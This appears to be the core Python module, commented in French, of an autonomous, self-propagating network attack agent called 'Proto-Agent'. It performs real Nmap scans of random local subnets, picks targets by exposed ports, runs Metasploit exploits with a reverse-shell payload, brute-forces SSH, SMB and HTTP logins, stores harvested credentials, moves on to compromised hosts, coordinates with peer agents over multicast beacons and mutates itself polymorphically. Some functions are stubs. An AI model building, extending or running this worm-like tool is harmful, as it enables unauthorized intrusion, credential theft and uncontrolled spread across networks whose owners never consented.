"""Core du Proto-Agent - Agent exploratoire autonome"""
import asyncio
import random
import time
import sys
from pathlib import Path
from typing import Dict, List, Optional

sys.path.insert(0, str(Path(__file__).parent.parent))

from utils.crypto_utils import CryptoManager
from utils.network_utils import MulticastBeacon
from utils.cve_database import CVEDatabase
from proto_agent.polymorphic import PolymorphicEngine
from proto_agent.recon.nmap_scanner import NmapScanner
from proto_agent.recon.fingerprint import Fingerprinter
from proto_agent.exploitation.msf_client import MSFClient
from proto_agent.exploitation.bruteforce import BruteforceEngine
from proto_agent.exploitation.exploit_selector import ExploitSelector


class ProtoAgent:
    """Agent exploratoire léger et polymorphe"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.node_id = config.get('node_id', f'proto_{int(time.time())}')
        self.sub_matriarche_id = config.get('sub_matriarche_id')
        
        # Crypto basique
        self.crypto = CryptoManager()
        
        # Polymorphisme
        self.polymorph = PolymorphicEngine()
        
        # Modules de reconnaissance RÉELS
        self.scanner = NmapScanner()
        self.fingerprinter = Fingerprinter()
        self.cve_db = CVEDatabase()
        
        # Modules d'exploitation RÉELS
        self.msf = MSFClient(password=config.get('msf_password', 'msf'))
        self.bruteforce = BruteforceEngine(delay=0.5)
        self.exploit_selector = ExploitSelector()
        
        # Connaissances accumulées (structure améliorée)
        self.knowledge = {
            'systems': {},  # {ip: {ports, services, os, vulns}}
            'paths': [],    # Chemins d'accès découverts
            'credentials': []  # Credentials trouvés
        }
        self.scripts = []
        self.current_location = config.get('initial_location', 'unknown')
        self.travel_history = [self.current_location]
        self.generation = 0
        
        # P2P
        self.beacon = MulticastBeacon(self.node_id, 'proto_agent')
        self.encounter_log = []
        self.beacon_interval = random.randint(300, 1800)  # 5-30 min
        
        # État
        self.status = 'idle'
        self.current_task = None
        self.discoveries = []
        
        self.running = False
    
    async def start(self):
        """Démarre le cycle de vie du Proto"""
        self.running = True
        print(f"[{self.node_id}] Proto-Agent starting at {self.current_location}")
        
        # Boucles parallèles
        await asyncio.gather(
            self._exploration_loop(),
            self._p2p_encounter_loop(),
            self._beacon_loop(),
            self._task_execution_loop()
        )
    
    async def _exploration_loop(self):
        """Boucle d'exploration autonome"""
        while self.running:
            try:
                if self.status == 'idle':
                    await self._explore()
                
                # Pause aléatoire entre explorations
                await asyncio.sleep(random.uniform(60, 300))
                
            except Exception as e:
                print(f"[{self.node_id}] Error in exploration: {e}")
                await asyncio.sleep(120)
    
    async def _p2p_encounter_loop(self):
        """Boucle d'écoute pour rencontres P2P"""
        while self.running:
            try:
                # Écoute des beacons d'autres Protos
                discovered = self.beacon.listen_for_beacons(timeout=10.0)
                
                for peer_beacon in discovered:
                    if self._should_engage(peer_beacon):
                        await self._encounter_peer(peer_beacon)
                
                await asyncio.sleep(random.uniform(30, 120))
                
            except Exception as e:
                print(f"[{self.node_id}] Error in P2P: {e}")
                await asyncio.sleep(180)
    
    async def _beacon_loop(self):
        """Émission périodique de beacons"""
        while self.running:
            try:
                # Broadcast présence
                beacon_data = self._create_beacon()
                # Note: beacon.broadcast_presence() serait bloquant, on simule
                
                await asyncio.sleep(self.beacon_interval * random.uniform(0.7, 1.3))
                
            except Exception as e:
                print(f"[{self.node_id}] Error in beacon: {e}")
                await asyncio.sleep(300)
    
    async def _task_execution_loop(self):
        """Exécution des tâches assignées"""
        while self.running:
            try:
                if self.status == 'working' and self.current_task:
                    await self._execute_task(self.current_task)
                
                await asyncio.sleep(30)
                
            except Exception as e:
                print(f"[{self.node_id}] Error in task execution: {e}")
                self.status = 'idle'
                await asyncio.sleep(60)
    
    async def _explore(self):
        """Exploration autonome de l'environnement"""
        print(f"[{self.node_id}] Exploring from {self.current_location}")
        
        # Scan environnement local
        nearby_systems = await self._discover_nearby()
        
        if nearby_systems:
            # Sélection cible
            target = self._select_target(nearby_systems)
            
            # Tentative d'accès
            if await self._attempt_access(target):
                # Migration réussie
                await self._migrate_to(target)
                await self._gather_local_intel(target)
    
    async def _discover_nearby(self) -> List[Dict]:
        """Découvre les systèmes à proximité - VRAI SCAN RÉSEAU"""
        print(f"[{self.node_id}] Starting network discovery...")
        
        nearby = []
        
        try:
            # Déterminer la plage réseau à scanner depuis current_location
            # Pour l'instant, scan d'une sous-plage aléatoire du réseau local
            base_ip = f'192.168.{random.randint(1, 254)}'
            scan_range = f'{base_ip}.{random.randint(1, 250)}-{random.randint(1, 254)}'
            
            # VRAI scan Nmap (mode fast pour ne pas être trop lent)
            print(f"[{self.node_id}] Scanning {scan_range}...")
            scan_results = await asyncio.to_thread(
                self.scanner.scan_network, scan_range, 'fast'
            )
            
            # Conversion des résultats Nmap en format interne
            for ip, host_info in scan_results.items():
                if host_info['state'] == 'up':
                    system = {
                        'id': f'system_{ip.replace(".", "_")}',
                        'ip': ip,
                        'hostname': host_info.get('hostname', 'unknown'),
                        'reachable': True,
                        'ports': len(host_info.get('ports', [])),
                        'services': host_info.get('ports', []),
                        'os': host_info.get('os', []),
                        'scan_time': host_info.get('scan_time')
                    }
                    
                    # Stockage dans knowledge base
                    self.knowledge['systems'][ip] = {
                        'ports': host_info.get('ports', []),
                        'os': host_info.get('os', []),
                        'hostname': host_info.get('hostname'),
                        'discovered_at': time.time(),
                        'discoverer': self.node_id
                    }
                    
                    nearby.append(system)
            
            print(f"[{self.node_id}] Discovered {len(nearby)} systems")
            
        except Exception as e:
            print(f"[{self.node_id}] Network discovery failed: {e}")
            # Fallback vers simulation si scan échoue
            nearby = []
        
        return nearby
    
    def _select_target(self, nearby_systems: List[Dict]) -> Optional[Dict]:
        """Sélectionne une cible pour exploration - ANALYSE RÉELLE"""
        # Filtre systèmes accessibles
        reachable = [s for s in nearby_systems if s.get('reachable')]
        
        if not reachable:
            return None
        
        # Calcul de score d'intérêt pour chaque système
        scored_targets = []
        for system in reachable:
            score = 0
            
            # Plus de ports ouverts = plus intéressant
            score += system.get('ports', 0) * 10
            
            # Services web (80, 443, 8080) = très intéressant
            services = system.get('services', [])
            web_ports = [80, 443, 8080, 8443]
            for svc in services:
                if isinstance(svc, dict) and svc.get('port') in web_ports:
                    score += 50
            
            # Services admin (22, 3389, 3306) = très intéressant
            admin_ports = [22, 23, 3389, 3306, 5432]
            for svc in services:
                if isinstance(svc, dict) and svc.get('port') in admin_ports:
                    score += 40
            
            scored_targets.append((system, score))
        
        # Tri par score et sélection probabiliste pondérée
        scored_targets.sort(key=lambda x: x[1], reverse=True)
        
        weights = [s[1] + 1 for s in scored_targets]  # +1 pour éviter 0
        target = random.choices([s[0] for s in scored_targets], weights=weights)[0]
        
        print(f"[{self.node_id}] Selected target {target['ip']} (score: {[s[1] for s in scored_targets if s[0] == target][0]})")
        
        return target
    
    async def _attempt_access(self, target: Dict) -> bool:
        """Tente d'accéder à un système - EXPLOITATION RÉELLE"""
        print(f"[{self.node_id}] Attempting access to {target['id']}")
        
        target_ip = target.get('ip')
        
        # Récupérer les vulnérabilités et services de ce système
        if target_ip not in self.knowledge['systems']:
            print(f"[{self.node_id}] No intelligence on {target_ip}, skipping")
            return False
        
        system_info = self.knowledge['systems'][target_ip]
        vulnerabilities = system_info.get('vulnerabilities', [])
        services = system_info.get('ports', [])
        
        # 1. EXPLOITATION PAR CVE (prioritaire)
        if vulnerabilities:
            print(f"[{self.node_id}] Attempting CVE exploitation ({len(vulnerabilities)} vulns)")
            
            # Obtenir chaîne d'exploitation
            target_data = {
                'ip': target_ip,
                'vulnerabilities': vulnerabilities,
                'services': services
            }
            
            exploit_chain = self.exploit_selector.get_exploit_chain(target_data)
            
            if exploit_chain:
                # Tenter premier exploit de la chaîne
                first_exploit = exploit_chain[0]
                
                if await self._attempt_exploitation(target_ip, first_exploit):
                    print(f"[{self.node_id}] ✓ Exploitation successful via {first_exploit['exploit']}")
                    
                    self.discoveries.append({
                        'type': 'successful_access',
                        'target': target['id'],
                        'target_ip': target_ip,
                        'timestamp': time.time(),
                        'method': 'exploit',
                        'exploit_used': first_exploit['exploit'],
                        'cve': first_exploit.get('cve')
                    })
                    
                    return True
        
        # 2. BRUTEFORCE (fallback)
        print(f"[{self.node_id}] Attempting bruteforce...")
        
        bruteforce_targets = self.exploit_selector.suggest_bruteforce_targets(services)
        
        for bf_target in bruteforce_targets[:2]:  # Top 2
            if await self._attempt_bruteforce(target_ip, bf_target):
                print(f"[{self.node_id}] ✓ Bruteforce successful on {bf_target['service']}")
                
                self.discoveries.append({
                    'type': 'successful_access',
                    'target': target['id'],
                    'target_ip': target_ip,
                    'timestamp': time.time(),
                    'method': 'bruteforce',
                    'service': bf_target['service']
                })
                
                return True
        
        print(f"[{self.node_id}] ✗ All access attempts failed")
        return False
    
    async def _attempt_exploitation(self, target_ip: str, exploit_info: Dict) -> bool:
        """Tente exploitation via Metasploit"""
        try:
            # Connexion MSF si pas déjà connecté
            if not self.msf.connected:
                if not await asyncio.to_thread(self.msf.connect):
                    return False
            
            # Exécution exploit
            result = await asyncio.to_thread(
                self.msf.run_exploit,
                exploit_info['exploit'],
                exploit_info['options'],
                exploit_info.get('payload', 'generic/shell_reverse_tcp')
            )
            
            if result.get('success'):
                # Stocker session info
                session_id = result['session_id']
                
                if target_ip not in self.knowledge['systems']:
                    self.knowledge['systems'][target_ip] = {}
                
                self.knowledge['systems'][target_ip]['msf_session'] = session_id
                
                return True
        
        except Exception as e:
            print(f"[{self.node_id}] Exploitation failed: {e}")
        
        return False
    
    async def _attempt_bruteforce(self, target_ip: str, bf_target: Dict) -> bool:
        """Tente bruteforce sur service"""
        service = bf_target['service']
        port = bf_target['port']
        
        # Listes de credentials
        usernames = BruteforceEngine.get_common_usernames()[:10]  # Top 10
        passwords = BruteforceEngine.get_common_passwords()[:10]  # Top 10
        
        try:
            if service == 'ssh':
                result = await asyncio.to_thread(
                    self.bruteforce.ssh_bruteforce,
                    target_ip, usernames, passwords, port
                )
            elif service == 'smb':
                result = await asyncio.to_thread(
                    self.bruteforce.smb_bruteforce,
                    target_ip, usernames, passwords
                )
            elif service == 'http':
                url = f"http://{target_ip}:{port}"
                result = await asyncio.to_thread(
                    self.bruteforce.http_basic_bruteforce,
                    url, usernames, passwords
                )
            else:
                return False
            
            if result.get('success'):
                # Stocker credentials
                self.knowledge['credentials'].append({
                    'ip': target_ip,
                    'service': service,
                    'port': port,
                    'username': result['username'],
                    'password': result['password'],
                    'discovered_at': time.time()
                })
                
                return True
        
        except Exception as e:
            print(f"[{self.node_id}] Bruteforce failed: {e}")
        
        return False
    
    async def _migrate_to(self, target: Dict):
        """Migre vers un nouveau système"""
        print(f"[{self.node_id}] Migrating to {target['id']}")
        
        old_location = self.current_location
        self.current_location = target['id']
        self.travel_history.append(target['id'])
        
        # Enregistrement du chemin dans la structure paths
        path_record = {
            'from': old_location,
            'to': target['id'],
            'to_ip': target.get('ip'),
            'timestamp': time.time(),
            'method': 'discovered',
            'proto_agent': self.node_id
        }
        
        self.knowledge['paths'].append(path_record)
    
    async def _gather_local_intel(self, target: Dict):
        """Collecte des informations sur le système local - FINGERPRINTING RÉEL"""
        print(f"[{self.node_id}] Gathering intel on {target['id']}")
        
        target_ip = target.get('ip')
        intel = {
            'type': 'system',
            'id': target['id'],
            'ip': target_ip,
            'discovered_at': time.time(),
            'discoverer': self.node_id,
            'fingerprint': {},
            'vulnerabilities': []
        }
        
        try:
            # HTTP Fingerprinting si port web ouvert
            services = target.get('services', [])
            web_ports = [80, 443, 8080, 8443]
            
            for svc in services:
                if isinstance(svc, dict) and svc.get('port') in web_ports:
                    port = svc['port']
                    protocol = 'https' if port in [443, 8443] else 'http'
                    url = f"{protocol}://{target_ip}:{port}"
                    
                    print(f"[{self.node_id}] Fingerprinting {url}...")
                    
                    # VRAI fingerprinting HTTP
                    fingerprint = await asyncio.to_thread(
                        self.fingerprinter.http_fingerprint, url
                    )
                    
                    intel['fingerprint'] = fingerprint
                    
                    # Identification des vulnérabilités basée sur fingerprint
                    vulns = self.fingerprinter.identify_vulnerabilities(fingerprint)
                    intel['vulnerabilities'].extend(vulns)
                    
                    break  # Un seul port web pour l'instant
            
            # Identification de vulnérabilités CVE pour chaque service
            for svc in services:
                if isinstance(svc, dict):
                    service_name = svc.get('service', '')
                    version = svc.get('version', '')
                    product = svc.get('product', '')
                    
                    if product and version:
                        # Recherche CVE
                        print(f"[{self.node_id}] Searching CVEs for {product} {version}...")
                        
                        cves = await asyncio.to_thread(
                            self.cve_db.search_by_service, product, version
                        )
                        
                        if cves:
                            print(f"[{self.node_id}] Found {len(cves)} CVEs for {product} {version}")
                            
                            for cve in cves[:5]:  # Top 5 CVEs
                                intel['vulnerabilities'].append({
                                    'type': 'cve',
                                    'cve_id': cve['cve_id'],
                                    'cvss_score': cve['cvss_score'],
                                    'description': cve['description'][:200],
                                    'service': f"{product} {version}",
                                    'port': svc.get('port')
                                })
            
            # Stockage dans knowledge base
            if target_ip in self.knowledge['systems']:
                self.knowledge['systems'][target_ip].update({
                    'fingerprint': intel['fingerprint'],
                    'vulnerabilities': intel['vulnerabilities']
                })
            
            print(f"[{self.node_id}] Intel gathered: {len(intel['vulnerabilities'])} vulnerabilities found")
            
        except Exception as e:
            print(f"[{self.node_id}] Intel gathering failed: {e}")
        
        self.discoveries.append(intel)
    
    def _should_engage(self, peer_beacon: Dict) -> bool:
        """Décide s'il faut s'engager avec un pair"""
        peer_id = peer_beacon.get('node_id')
        
        # Évite de re-rencontrer trop vite
        recent = [e for e in self.encounter_log 
                 if time.time() - e['timestamp'] < 3600]  # 1h
        
        if peer_id in [e['peer_id'] for e in recent]:
            return False
        
        # Plus le pair a voyagé, plus attractif
        travel_count = peer_beacon.get('travel_count', 0)
        engagement_prob = 0.3 + min(travel_count * 0.05, 0.5)
        
        return random.random() < engagement_prob
    
    async def _encounter_peer(self, peer_beacon: Dict):
        """Rencontre avec un pair Proto"""
        peer_id = peer_beacon.get('node_id')
        print(f"[{self.node_id}] Encountering peer {peer_id}")
        
        # Échange de connaissances
        await self._exchange_knowledge(peer_beacon)
        
        # Échange de scripts
        await self._exchange_scripts(peer_beacon)
        
        # Log de la rencontre
        self.encounter_log.append({
            'peer_id': peer_id,
            'timestamp': time.time(),
            'location': peer_beacon.get('location')
        })
    
    async def _exchange_knowledge(self, peer_beacon: Dict):
        """Échange de connaissances avec un pair"""
        # Simulation d'échange
        print(f"[{self.node_id}] Exchanging knowledge with peer")
        
        # Dans un vrai système: communication réseau réelle
        # Ici: simulation d'échange
        
        # Calcul valeur respective
        my_value = len(self.travel_history) * len(self.knowledge)
        peer_value = peer_beacon.get('travel_count', 0) * 10  # Estimation
        
        # Échange asymétrique
        if my_value < peer_value:
            # Recevoir plus
            print(f"[{self.node_id}] Receiving more knowledge (less experienced)")
        else:
            # Donner plus
            print(f"[{self.node_id}] Sharing more knowledge (more experienced)")
    
    async def _exchange_scripts(self, peer_beacon: Dict):
        """Échange de scripts/payloads avec un pair"""
        print(f"[{self.node_id}] Exchanging scripts with peer")
        
        # Simulation
        # Dans un vrai système: partage de code réel
    
    def _create_beacon(self) -> Dict:
        """Crée un beacon pour broadcast"""
        return {
            'node_id': self.node_id,
            'node_type': 'proto_agent',
            'location': self.current_location,
            'travel_count': len(self.travel_history),
            'timestamp': time.time()
        }
    
    def assign_task(self, task: Dict):
        """Assigne une tâche au Proto"""
        print(f"[{self.node_id}] Task assigned: {task.get('type')}")
        self.current_task = task
        self.status = 'working'
    
    async def _execute_task(self, task: Dict):
        """Exécute une tâche assignée"""
        task_type = task.get('type')
        
        print(f"[{self.node_id}] Executing task: {task_type}")
        
        # Simulation d'exécution selon le type
        if task_type == 'reconnaissance':
            await self._task_reconnaissance(task)
        elif task_type == 'path_finding':
            await self._task_path_finding(task)
        elif task_type == 'exploitation':
            await self._task_exploitation(task)
        else:
            await self._task_generic(task)
        
        # Tâche terminée
        self.status = 'idle'
        self.current_task = None
    
    async def _task_reconnaissance(self, task: Dict):
        """Tâche de reconnaissance"""
        print(f"[{self.node_id}] Performing reconnaissance")
        
        # Découverte de systèmes
        systems = await self._discover_nearby()
        
        for system in systems:
            self.discoveries.append({
                'type': 'system',
                'data': system,
                'task_id': task.get('task_id'),
                'timestamp': time.time()
            })
        
        await asyncio.sleep(random.uniform(5, 15))
    
    async def _task_path_finding(self, task: Dict):
        """Recherche de chemins"""
        print(f"[{self.node_id}] Finding paths")
        
        # Analyse des chemins possibles
        await asyncio.sleep(random.uniform(10, 30))
    
    async def _task_exploitation(self, task: Dict):
        """Exploitation de vulnérabilités"""
        print(f"[{self.node_id}] Attempting exploitation")
        
        # Tentative d'exploitation
        success = random.random() < 0.4
        
        if success:
            self.discoveries.append({
                'type': 'successful_exploit',
                'task_id': task.get('task_id'),
                'timestamp': time.time()
            })
        
        await asyncio.sleep(random.uniform(15, 45))
    
    async def _task_generic(self, task: Dict):
        """Tâche générique"""
        print(f"[{self.node_id}] Executing generic task")
        await asyncio.sleep(random.uniform(10, 30))
    
    def receive_mutation(self, mutation: Dict):
        """Reçoit une mutation de la hiérarchie"""
        print(f"[{self.node_id}] Received mutation")
        
        self.scripts.append(mutation)
        self.generation += 1
        
        # Application de la mutation
        if random.random() < 0.1:  # 10% chance de polymorphisme
            self.polymorph.mutate_self()
    
    async def shutdown(self):
        """Arrêt propre"""
        print(f"[{self.node_id}] Shutting down")
        self.running = False


async def main():
    """Point d'entrée"""
    import sys
    
    proto_id = sys.argv[1] if len(sys.argv) > 1 else f'proto_{int(time.time())}'
    
    config = {
        'node_id': proto_id,
        'sub_matriarche_id': 'sub_001',
        'initial_location': 'start_zone'
    }
    
    proto = ProtoAgent(config)
    
    try:
        await proto.start()
    except KeyboardInterrupt:
        await proto.shutdown()


if __name__ == '__main__':
    asyncio.run(main())
